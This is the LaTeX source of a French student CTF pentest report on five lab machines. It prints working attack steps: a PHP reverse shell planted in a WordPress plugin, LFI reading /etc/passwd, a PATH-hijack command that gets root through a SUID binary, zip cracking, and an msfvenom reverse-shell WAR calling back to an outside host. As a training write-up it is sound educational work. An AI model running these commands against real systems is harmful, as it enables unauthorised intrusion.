\documentclass[11pt,a4paper]{article}

% =========================================================================
%  RAPPORT CTF — PENTEST DE 5 MACHINES
%  Auteurs : HONORINE Kylian & GRONDIN Angélique
%  Theme   : Sécurité offensive — palette rouge / noir
% =========================================================================

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[french]{babel}
\usepackage{lmodern}
\usepackage[a4paper,margin=2.2cm,top=2.6cm,bottom=2.4cm]{geometry}
\usepackage{xcolor}
\usepackage{fontawesome5}
\usepackage{tikz}
\usetikzlibrary{shapes.geometric,positioning,calc,arrows.meta,decorations.pathreplacing}
\usepackage{titlesec}
\usepackage[most]{tcolorbox}
\usepackage{listings}
\usepackage{fancyhdr}
\usepackage{booktabs}
\usepackage{tabularx}
\usepackage{array}
\usepackage{colortbl}
\usepackage{enumitem}
\usepackage{microtype}
\usepackage[bookmarks=true,colorlinks=true,linkcolor=accent,urlcolor=accent,citecolor=accent]{hyperref}

% --- Palette : sécurité offensive ----------------------------------------
\definecolor{primary}{HTML}{0F1419}        % presque noir
\definecolor{accent}{HTML}{C8102E}         % rouge offensif
\definecolor{accentdark}{HTML}{8B0000}
\definecolor{light}{HTML}{F5F5F7}
\definecolor{midgray}{HTML}{6B7280}
\definecolor{codebg}{HTML}{1B1F23}
\definecolor{codefg}{HTML}{F8F8F2}
\definecolor{codekw}{HTML}{FF6188}
\definecolor{codestr}{HTML}{A9DC76}
\definecolor{codecmt}{HTML}{75715E}

% --- Typographie des titres ----------------------------------------------
\titleformat{\section}{\sffamily\Large\bfseries\color{primary}}{\thesection}{0.8em}{}[\vspace{-0.4ex}{\color{accent}\rule{\linewidth}{1.2pt}}]
\titleformat{\subsection}{\sffamily\large\bfseries\color{accent}}{\thesubsection}{0.6em}{}
\titleformat{\subsubsection}{\sffamily\normalsize\bfseries\color{primary}}{\thesubsubsection}{0.5em}{}
\titlespacing*{\section}{0pt}{1.6em}{0.8em}

% --- En-tête / pied de page ----------------------------------------------
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0pt}
\renewcommand{\footrulewidth}{0pt}
\fancyhead[L]{\footnotesize\sffamily\color{midgray}\faSkullCrossbones~CTF — Sécurité offensive}
\fancyhead[R]{\footnotesize\sffamily\color{midgray}Honorine \& Kylian}
\fancyfoot[C]{\footnotesize\sffamily\color{midgray}\thepage}

% --- Listings (style terminal) -------------------------------------------
\lstdefinestyle{terminal}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize\color{codefg},
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  showstringspaces=false,
  breaklines=true,
  frame=none,
  framesep=8pt,
  framerule=0pt,
  rulecolor=\color{codebg},
  xleftmargin=12pt,
  xrightmargin=12pt,
  belowskip=0pt,
  aboveskip=0pt,
  columns=fullflexible,
  inputencoding=utf8,
  extendedchars=true,
  literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ô}{{\^o}}1 {î}{{\^\i}}1 {ç}{{\c{c}}}1 {ù}{{\`u}}1 {â}{{\^a}}1 {É}{{\'E}}1 {È}{{\`E}}1
}
\lstset{style=terminal,language=bash}

\newtcblisting{shellbox}[1][]{
  listing only,
  enhanced jigsaw, breakable,
  colback=codebg, colframe=accent,
  arc=2pt, boxrule=0pt, leftrule=3pt,
  left=8pt, right=8pt, top=4pt, bottom=4pt,
  listing options={style=terminal,language=bash},
  #1
}

% --- Boîtes thématiques --------------------------------------------------
\newtcolorbox{infobox}[1][]{
  enhanced, colback=light, colframe=accent,
  arc=2pt, boxrule=0pt, leftrule=3pt,
  left=10pt, right=10pt, top=6pt, bottom=6pt,
  fontupper=\small, #1
}
\newtcolorbox{flagbox}[1][]{
  enhanced, colback=accent!10, colframe=accent,
  arc=2pt, boxrule=0pt, leftrule=3pt,
  left=10pt, right=10pt, top=6pt, bottom=6pt,
  fontupper=\small, #1
}
\newtcolorbox{warnbox}[1][]{
  enhanced, colback=primary!5, colframe=primary,
  arc=2pt, boxrule=0pt, leftrule=3pt,
  left=10pt, right=10pt, top=6pt, bottom=6pt,
  fontupper=\small, #1
}

% --- Étapes numérotées ---------------------------------------------------
\newcommand{\step}[2]{%
\par\noindent\begin{minipage}{0.06\linewidth}\begin{tikzpicture}\node[circle,fill=accent,text=white,minimum size=1.6em,font=\sffamily\bfseries\small]{#1};\end{tikzpicture}\end{minipage}%
\begin{minipage}{0.93\linewidth}\textbf{#2}\end{minipage}\par\smallskip}

\setlist[itemize]{leftmargin=*,itemsep=2pt,topsep=4pt}
\setlist[enumerate]{leftmargin=*,itemsep=2pt,topsep=4pt}

% =========================================================================
\begin{document}
\pagenumbering{gobble}

% ---- PAGE DE TITRE ------------------------------------------------------
\begin{tikzpicture}[remember picture, overlay]
  % Bandeau supérieur sombre
  \fill[primary] (current page.north west) rectangle ([yshift=-9cm]current page.north east);
  % Lignes d'accent
  \fill[accent] ([yshift=-9cm]current page.north west) rectangle ([yshift=-9.25cm]current page.north east);
  % Logo : terminal stylisé avec skull
  \node[anchor=center] at ([yshift=-4.6cm]current page.north) {%
    \begin{tikzpicture}[scale=1]
      % cadre terminal
      \fill[white,rounded corners=4pt] (-2.2,-1.6) rectangle (2.2,1.6);
      \fill[primary,rounded corners=4pt] (-2.2,1) rectangle (2.2,1.6);
      % boutons fenêtre
      \fill[accent] (-1.95,1.3) circle (0.13);
      \fill[orange!80!yellow] (-1.55,1.3) circle (0.13);
      \fill[green!60!black] (-1.15,1.3) circle (0.13);
      % skull au centre
      \node[scale=2.6,accent] at (0,-0.05) {\faSkullCrossbones};
      % prompt
      \node[font=\ttfamily\bfseries\small,primary] at (-1.4,0.55) {\$};
      \node[font=\ttfamily\bfseries\small,primary] at (-0.95,0.55) {root@kali};
    \end{tikzpicture}};
  % Titre
  \node[anchor=north, white, font=\sffamily\Huge\bfseries] at ([yshift=-6.7cm]current page.north) {CTF — Cinq Machines};
  \node[anchor=north, accent, font=\sffamily\Large] at ([yshift=-7.65cm]current page.north) {Rapport de Test de Pénétration};
  \node[anchor=north, white!75!primary, font=\sffamily\small] at ([yshift=-8.4cm]current page.north) {SAE Autonomie \textbullet{} Sécurité Offensive};

  % Bas de page : auteurs
  \node[anchor=south west, primary, font=\sffamily\small] at ([xshift=2.2cm,yshift=3cm]current page.south west) {\textbf{\textcolor{accent}{Auteurs}}};
  \node[anchor=south west, primary, font=\sffamily\small] at ([xshift=2.2cm,yshift=2.5cm]current page.south west) {Honorine \textbullet{} Kylian};
  \node[anchor=south east, primary, font=\sffamily\small] at ([xshift=-2.2cm,yshift=3cm]current page.south east) {\textbf{\textcolor{accent}{Date}}};
  \node[anchor=south east, primary, font=\sffamily\small] at ([xshift=-2.2cm,yshift=2.5cm]current page.south east) {Février 2026};
  % Pied
  \fill[accent] ([yshift=1.3cm]current page.south west) rectangle ([yshift=1.4cm]current page.south east);
  \node[anchor=south, midgray, font=\sffamily\footnotesize] at ([yshift=0.6cm]current page.south) {IUT Réseaux \& Télécommunications — Université de La Réunion};
\end{tikzpicture}
\newpage

\pagenumbering{arabic}
\setcounter{page}{1}

% ---- SOMMAIRE -----------------------------------------------------------
{\sffamily
\hypersetup{linkcolor=primary}
\renewcommand{\contentsname}{\textcolor{accent}{\faList~} Sommaire}
\tableofcontents
}
\vspace{0.4cm}

% ---- INTRODUCTION -------------------------------------------------------
\section{Contexte de la mission}

\begin{infobox}[title={\faBullseye~Objectif}]
Compromettre cinq machines cibles et obtenir un accès \texttt{root} sur chacune, en mobilisant des techniques de pentest variées : reconnaissance, exploitation de services web, élévation de privilèges, et analyse de binaires SUID.
\end{infobox}

Chaque machine combine plusieurs vulnérabilités et configurations défaillantes représentatives de scénarios rencontrés en environnement réel. Le présent rapport documente les chemins d'attaque retenus, les outils mobilisés, et les contre-mesures à déployer.

\medskip
\noindent\textbf{Résultat global :} \textcolor{accent}{\textbf{4/5 machines compromises (80\%)}} \textemdash{} Machine 5 partiellement aboutie.

% ---- MACHINE 1 ----------------------------------------------------------
\section{Machine 1 — WordPress}

\subsection{Reconnaissance}
Scan Nmap avec détection de versions et scripts par défaut sur la cible \texttt{192.168.1.17} :
\begin{shellbox}
nmap -sV -sC 192.168.1.17
\end{shellbox}
Le scan révèle : SSH (22), HTTP (80), POP3 (110), IMAP (143). Le port 80 héberge un site \og en test \fg{}.

\subsection{Découverte du CMS}
Inspection manuelle du fichier \texttt{robots.txt} : un répertoire \texttt{/wordpress/} est exposé, confirmant le CMS cible. Énumération complète des chemins avec Gobuster :
\begin{shellbox}
gobuster dir -u http://192.168.1.17 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40
\end{shellbox}
Gobuster identifie également \texttt{/upload}, mais l'effort se concentre sur l'installation WordPress.

\subsection{Exploitation}
La page \texttt{wp-login.php} accepte des identifiants administrateurs faibles. Une fois connectés au back-office, nous éditons un plugin pour y injecter un reverse shell PHP pointant vers Kali sur le port 9001.

\begin{shellbox}
nc -lvnp 9001
\end{shellbox}

L'activation du plugin déclenche la connexion : nous obtenons un shell en tant que \texttt{www-data}.

\subsection{Élévation de privilèges}
Le shell est stabilisé via Python (\texttt{python -c 'import pty; pty.spawn("/bin/bash")'}). L'exploration de \texttt{wp-config.php} expose les identifiants MySQL, qui se révèlent réutilisés pour le compte \texttt{root} système.

\begin{flagbox}[title={\faFlag~Machine 1 compromise}]
\textbf{Vecteur :} Réutilisation des identifiants MySQL pour l'accès \texttt{root}.\\
\textbf{Leçon :} Une politique de mot de passe distincte par service est non négociable.
\end{flagbox}

% ---- MACHINE 4 ----------------------------------------------------------
\section{Machine 4 — LFI + FTP + Binaire SUID}

\subsection{Exploration initiale}
Le serveur Apache filtre les requêtes selon l'\texttt{User-Agent}. Contournement immédiat en se faisant passer pour Googlebot :
\begin{shellbox}
curl -A "Googlebot" http://192.168.1.46/robots.txt
\end{shellbox}
Un répertoire caché est révélé.

\subsection{Local File Inclusion}
La vérification des paramètres GET expose une vulnérabilité LFI permettant de lire \texttt{/etc/passwd} et autres fichiers sensibles \textemdash{} y compris la configuration du serveur, qui mentionne un service FTP en écriture.

\subsection{Pivot via FTP}
Le répertoire \texttt{pub} du FTP autorise l'\texttt{anonymous upload}. Nous y déposons un reverse shell PHP, puis l'exécutons via la LFI précédemment découverte.

\begin{shellbox}
nc -lvnp 9001
# Déclenchement : LFI ciblant /var/ftp/pub/shell.php
\end{shellbox}

Connexion reçue en tant que \texttt{www-data}. Le flag utilisateur est récupéré dans \texttt{/var/www/}.

\subsection{Analyse du binaire SUID}
Dans \texttt{/home/tom/}, un binaire \texttt{adminshell} possède le bit SUID. Son code source révèle une vérification d'identité par appel à \texttt{whoami} sans chemin absolu :

\begin{shellbox}[listing options={style=terminal,language=C}]
if (strcmp(getlogin(), "admin") == 0) {
    system("whoami");  // PATH non controle : injectable
}
\end{shellbox}

\subsection{PATH Hijacking}
Un faux binaire \texttt{whoami} est créé pour spawner un shell, le \texttt{PATH} est manipulé pour le résoudre en priorité :
\begin{shellbox}
echo '/bin/sh' > /tmp/whoami && chmod +x /tmp/whoami
export PATH=/tmp:$PATH
./adminshell
\end{shellbox}

Le binaire SUID exécute notre faux \texttt{whoami} avec les privilèges \texttt{root}.

\begin{flagbox}[title={\faFlag~Machine 4 compromise — root obtenu}]
\textbf{Vecteur :} LFI \(\rightarrow\) FTP anonyme \(\rightarrow\) PATH Hijacking sur binaire SUID.\\
\textbf{Leçon :} Tout appel système dans un binaire privilégié doit utiliser un chemin absolu.
\end{flagbox}

\subsection{Nettoyage}
Suppression du \texttt{shell.php} déposé sur le FTP pour ne pas laisser de trace exploitable par d'autres équipes.

% ---- MACHINE 5 ----------------------------------------------------------
\section{Machine 5 — Tomcat}

\subsection{Découverte}
Nikto identifie un fichier \texttt{backup.zip} accessible sans authentification.
\begin{shellbox}
nikto -h http://target
fcrackzip -D -p rockyou.txt -u backup.zip
\end{shellbox}
L'archive est protégée par mot de passe ; \texttt{fcrackzip} le craque en quelques minutes via dictionnaire.

\subsection{Obtention du shell}
Un fichier WAR contenant un reverse shell est généré avec Metasploit, puis déployé via Tomcat Manager (identifiants extraits du backup) :
\begin{shellbox}
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.0.0.5 LPORT=9001 -f war > shell.war
\end{shellbox}

Le déploiement réussit et un shell utilisateur \texttt{jerry} est obtenu.

\subsection{Limite}
\begin{warnbox}[title={\faExclamationTriangle~Élévation non aboutie}]
Malgré de nombreuses tentatives (énumération SUID, exploits kernel, sudo, capabilities), l'élévation vers \texttt{root} n'a pas pu être réalisée dans le temps imparti. Le flag utilisateur a néanmoins été récupéré dans \texttt{/home/jerry/}.
\end{warnbox}

% ---- TABLEAU RÉCAPITULATIF ----------------------------------------------
\section{Synthèse des compromissions}

\renewcommand{\arraystretch}{1.35}
\begin{tabularx}{\linewidth}{@{}>{\bfseries}l X >{\centering\arraybackslash}p{2.4cm}@{}}
\toprule
\rowcolor{light} Machine & Vecteur principal & Statut \\ \midrule
1 — WordPress & Plugin malveillant + réutilisation credentials MySQL & \textcolor{accent}{\faCheckCircle~Root} \\
2 — GRUB      & Modification entrée GRUB \(\rightarrow\) shell init & \textcolor{accent}{\faCheckCircle~Root} \\
3 — FTP exploit & Exploitation service FTP vulnérable & \textcolor{accent}{\faCheckCircle~Root} \\
4 — LFI + FTP   & LFI \(\rightarrow\) FTP \(\rightarrow\) PATH Hijacking SUID & \textcolor{accent}{\faCheckCircle~Root} \\
5 — Tomcat      & Backup ZIP cracké + WAR Manager & \textcolor{orange!80!black}{\faExclamationCircle~Partiel} \\
\bottomrule
\end{tabularx}

% ---- LESSONS LEARNED ----------------------------------------------------
\section{Enseignements et points clés}

\begin{enumerate}
  \item \textbf{La reconnaissance conditionne tout.} Un scan Nmap mal calibré ferme des portes que l'on ne rouvre pas.
  \item \textbf{La réutilisation des mots de passe reste critique.} Trois machines sur cinq exploitées via ce vecteur.
  \item \textbf{Les configurations par défaut sont dangereuses.} Comptes admin/admin, FTP anonyme, Tomcat Manager exposé.
  \item \textbf{L'élévation de privilèges récompense la patience.} Étudier les binaires SUID, examiner les variables d'environnement, lire le code source quand il est accessible.
  \item \textbf{Le nettoyage des traces fait partie du pentest.} Un shell oublié sur un FTP partagé est une faille livrée à autrui.
  \item \textbf{Combiner les vulnérabilités} : aucune des cinq compromissions ne repose sur une seule faille.
\end{enumerate}

\vspace{1cm}
\begin{center}
{\sffamily\itshape\color{midgray}\large
\og La sécurité n'est pas un produit, mais un processus. \fg{}}\\[2pt]
{\footnotesize\color{midgray}— Bruce Schneier}
\end{center}

\end{document}
